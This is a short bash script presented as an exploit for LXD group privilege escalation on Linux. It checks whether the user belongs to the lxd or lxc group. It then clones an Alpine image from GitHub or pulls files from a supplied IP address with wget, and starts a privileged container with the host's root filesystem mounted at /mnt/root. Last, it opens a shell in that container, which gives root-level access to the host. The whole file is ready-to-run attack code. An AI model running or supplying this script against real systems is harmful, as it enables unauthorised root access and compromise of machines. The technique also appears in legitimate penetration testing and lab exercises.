#!/bin/bash
read -sp "Enter your IP(only if git doesn't work) : " ip
addr="https://github.com/lykan89/lxd-Privilege-escalation.git"
repo="https://github.com/lykan89/lxd-Privilege-escalation/blob/main/README.md"
#-----------exploit script-----------
exploit(){
        echo "This exploit takes less than 1 minute to execute... if not check out my github readme $repo "
        echo "Initializing..."
        echo "Cloning alpine..."
        if [ -z $ip ];then
                echo "----------------------cloning done-------------------------"
                git clone $addr
        else
                echo "--------------------fetching from $ip-----------------------"
                wget -r -nH -np http://$ip/
        fi
        cd "LXD-privilege-escalation"
        lxc image import ./alpine-v3.20*.tar.gz --alias myimg
        lxc init myimg mycontainer -c security.privileged=true
        lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
        lxc start mycontainer
        echo "----------------Privelege Escalation done-------------------"
        lxc exec mycontainer /bin/sh
}

cmd=$(id | grep "lxc\|lxd")
echo "checking vulnerability..."
echo $cmd
if [ -z $cmd ];then
        echo "Not exploitable...no lxd/lxc group found"
else
        exploit
fi